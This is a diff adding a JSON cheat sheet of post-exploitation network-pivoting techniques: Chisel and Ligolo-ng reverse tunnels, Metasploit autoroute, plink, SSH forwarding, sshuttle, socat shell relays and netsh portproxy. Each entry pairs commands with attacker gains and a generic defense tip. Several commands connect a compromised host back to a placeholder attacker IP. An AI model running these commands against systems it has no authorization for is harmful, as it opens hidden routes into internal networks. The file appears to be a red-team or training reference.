@@ -1,0 +1,235 @@
+[
+  {
+    "id": "3c928255-84ec-5d3a-bd35-ecb7e6b80c84",
+    "label": "Chisel Client (Reverse SOCKS Connect)",
+    "command": "# Connects to the attacker's Chisel server and requests it to open SOCKS proxy port 1080\n./chisel client <Attacker-IP>:8000 R:socks",
+    "description": "<p>Executes the Chisel client on the compromised internal host, connecting back to the attacker and opening a remote SOCKS proxy into the internal network.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> chisel.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:chisel"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "e508652a-e54d-5f31-86b5-ef6716b57aee",
+    "label": "Chisel Local Port Forwarding (Client)",
+    "command": "# Binds attacker port 3306 to internal DB IP 10.10.10.5:3306\n./chisel client <Attacker-IP>:8000 R:3306:10.10.10.5:3306",
+    "description": "<p>Uses Chisel to forward a specific port on the internal network back to the attacker, avoiding full SOCKS proxying.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> chisel.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:chisel"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "4387b060-bed9-5f16-9fa6-b8c0671e25f9",
+    "label": "Chisel Server (Reverse SOCKS Setup)",
+    "command": "# Starts the Chisel server on port 8000, allowing reverse port forwarding tunnels.\n./chisel server -p 8000 --reverse",
+    "description": "<p>Sets up the Chisel server on the attacker machine to listen for incoming connections from a compromised host, enabling a reverse SOCKS tunnel.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> chisel.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:chisel"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "4eb8ba8e-6d10-54b5-9c3c-bad00452f17b",
+    "label": "Graftcp SOCKS Execution wrapper",
+    "command": "graftcp-local -listen :2233 -socks5 127.0.0.1:1080\ngraftcp ./nuclei -u http://10.10.10.10",
+    "description": "<p>An alternative to proxychains that redirects a specific Go or compiled program's TCP traffic through a SOCKS5 proxy via library hooking.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> payloadsallthethings-pivoting.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "dfb64c9c-f857-5c83-a6fe-d4549ba27147",
+    "label": "Ligolo-ng Agent Execution",
+    "command": "# Connect the agent to the attacker's running proxy\n./agent -connect <Attacker-IP>:11601 -ignore-cert",
+    "description": "<p>Executes the Ligolo agent on the compromised host to connect back to the attacker's proxy listener over a multiplexed, TLS-encrypted connection.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> ligolo-ng.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ligolo-ng"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "34407cae-7501-50f3-b1f8-0b19af5471d4",
+    "label": "Ligolo-ng IP Route Addition",
+    "command": "# From within the Ligolo interactive proxy CLI:\nsession\nstart\n\n# From the Attacker Unix Terminal: Add route to internal subnet\nsudo ip route add 10.20.0.0/24 dev ligolo",
+    "description": "<p>Modifies the attacker's local routing table to push traffic for the internal subnet directly through the Ligolo TUN interface.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> ligolo-ng.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ligolo-ng"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "1197aa5b-2774-5858-82b5-4343803e6df7",
+    "label": "Ligolo-ng Proxy/Server Setup (TUN Interface)",
+    "command": "# Create the TUN interface\nsudo ip tuntap add user <your-user> mode tun ligolo\nsudo ip link set ligolo up\n\n# Start the ligolo-ng proxy listener\n./proxy -selfcert",
+    "description": "<p>Initializes the Ligolo-ng proxy server by setting up a dedicated TUN network interface on the attacker machine for pure IP-level VPN routing.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> ligolo-ng.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ligolo-ng"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "c8361659-2ba4-5e00-b6ca-3c28f1a9f0ed",
+    "label": "Metasploit Autoroute / SOCKS Proxy Setup",
+    "command": "# From Metasploit Framework:\nrun post/multi/manage/autoroute\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun -j",
+    "description": "<p>Leverages an established Meterpreter session to automatically route Metasploit modules into the internal network and expose it as a SOCKS proxy.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> hacktricks-tunneling.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:metasploit"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "87c80bd6-9696-5b85-ad95-7e86eec6c1c0",
+    "label": "Plink.exe Remote Port Forwarding (Windows -> Linux)",
+    "command": "# Connects to Attacker-IP, logs in via SSH, and opens port 4444 on the attacker\nplink.exe -ssh -l <username> -pw <password> -R 4444:127.0.0.1:445 <Attacker-IP>",
+    "description": "<p>Uses PuTTY's command-line interface (`plink.exe`) to establish a reverse SSH tunnel from a Windows victim to an attacker's SSH server.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> payloadsallthethings-pivoting.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "platform:windows"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "22afc97c-2a8d-5ea8-8b8a-0c30b231bc9c",
+    "label": "Proxychains Configuration",
+    "command": "# Ensure proxychains is configured to use the Chisel / SSH socks proxy:\nsed -i 's/^socks4/#socks4/' /etc/proxychains.conf\necho \"socks5 127.0.0.1 1080\" >> /etc/proxychains.conf\n\n# Execute tools through the tunnel:\nproxychains -q nmap -Pn -sT -p 135,445 10.20.0.5",
+    "description": "<p>Modifies the `/etc/proxychains.conf` file to route standard command-line tools (Nmap, CrackMapExec) through an established SOCKS proxy.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> payloadsallthethings-pivoting.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:proxychains"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "656574b2-b64c-5666-b1a0-1f702af2e6d3",
+    "label": "SSH Dynamic Port Forwarding (-D / SOCKS)",
+    "command": "# Creates a SOCKS proxy listening on 1080/tcp locally.\nssh -N -f -D 1080 <user>@<Pivot-IP>",
+    "description": "<p>Creates a dynamic SOCKS proxy on the attacker's local machine that routes all traffic through the SSH connection. Combining with Proxychains enables full network scanning.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> payloadsallthethings-pivoting.md (SSH section)</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ssh"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "f4a5a0ca-6bbc-5b68-983c-1e894d4333e4",
+    "label": "SSH Jump Host (ProxyJump flag)",
+    "command": "# SSH directly to the InternalTarget by jumping transparently through the DMZHost\nssh -J <jump-user>@<DMZHost-IP> <target-user>@<InternalTarget-IP>",
+    "description": "<p>An extremely clean way to SSH transparently through one or multiple pivot boxes using OpenSSH's modern `-J` flag.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> hacktricks-tunneling.md / payloadsallthethings-pivoting.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ssh"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "c26f4346-49d4-5067-b491-7155d5d6f657",
+    "label": "SSH Local Port Forwarding (-L)",
+    "command": "# Connects to Pivot-IP via SSH. Maps Attacker:8080 to Target-IP:80 through Pivot-IP.\nssh -N -L 8080:<Target-IP>:80 <user>@<Pivot-IP>",
+    "description": "<p>Forwards a local port on the attacker machine to a remote port on the target network through an SSH pivot host. Useful for accessing internal services like databases or web servers.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> payloadsallthethings-pivoting.md (SSH section)</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ssh"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "9b7371b5-8c7c-5196-b6e6-008bb845afdc",
+    "label": "SSH Remote Port Forwarding (-R)",
+    "command": "# Connects to Pivot-IP via SSH. Opens port 9042 on Pivot-IP, forwarding traffic back to Attacker's port 4444.\nssh -N -R 9042:127.0.0.1:4444 <user>@<Pivot-IP>",
+    "description": "<p>Forwards a remote port on the SSH server (pivot) back to a local port on the attacker machine. Often used to catch reverse shells traversing firewalls.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> payloadsallthethings-pivoting.md (SSH section)</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ssh"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "e84010ba-bf2a-5dfa-accd-75b92d2733b0",
+    "label": "SSHuttle (Transparent Proxy)",
+    "command": "# Routes all traffic destined for 10.2.2.0/24 through the pivot jump host\nsudo sshuttle -r <user>@<Pivot-IP> 10.2.2.0/24",
+    "description": "<p>Acts similar to a VPN, transparently routing all subnet traffic through an SSH pivot without requiring Proxychains. Needs root privileges to modify iptables locally.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> hacktricks-tunneling.md / payloadsallthethings-pivoting.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:ssh"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "9e7b0869-37a7-5f90-af2a-4a61a93ed37e",
+    "label": "Socat Reverse Shell Relay (Listen -> Listen)",
+    "command": "# Listens on 8000 to catch the shell, binds to 9000 to wait for the attacker\nsocat TCP4-LISTEN:8000 TCP4-LISTEN:9000",
+    "description": "<p>Uses Socat to catch a reverse shell from a deeply nested internal subnet and relay it back to the attacker machine.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> hacktricks-tunneling.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:socat"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "fab01e0b-81ac-5872-9bdd-6b78c787cb83",
+    "label": "Socat TCP Port Forwarding (Listen -> Connect)",
+    "command": "# Listens on 8080 and forwards traffic to 10.10.10.5:80\nsocat TCP4-LISTEN:8080,fork TCP4:10.10.10.5:80",
+    "description": "<p>Uses Socat as a relay on a pivot host to bind a local listening port and forward all incoming connections to a destination port.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> hacktricks-tunneling.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "tool:socat"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  },
+  {
+    "id": "973c0c2d-bbea-51db-9259-96c7dded5d96",
+    "label": "Windows Netsh Portproxy",
+    "command": "# Forwards traffic hitting the pivot on 4545 to the attacker's IP on 4545\nnetsh interface portproxy add v4tov4 listenport=4545 connectaddress=<Attacker-IP> connectport=4545\n\n# Open local firewall to allow the connection\nnetsh advfirewall firewall add rule name=\"PortForwarding 4545\" dir=in action=allow protocol=TCP localport=4545",
+    "description": "<p>The native \"Living off the Land\" technique for port forwarding on modern Windows endpoints without uploading custom tools. Requires local Administrator privileges.</p>\n<p>This technique is categorized as a high-value network pivoting action.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.</li>\n  <li><strong>Attack pre-requisite:</strong> Administrative access or the ability to execute tunneling binaries on the compromised jump host.</li>\n</ol>\n<ul>\n  <li><strong>Source:</strong> payloadsallthethings-pivoting.md</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.</li>\n</ul>",
+    "tags": [
+      "network:pivot",
+      "post-exploitation",
+      "platform:windows"
+    ],
+    "color": "#f59e0b",
+    "hasGraph": false
+  }
+]
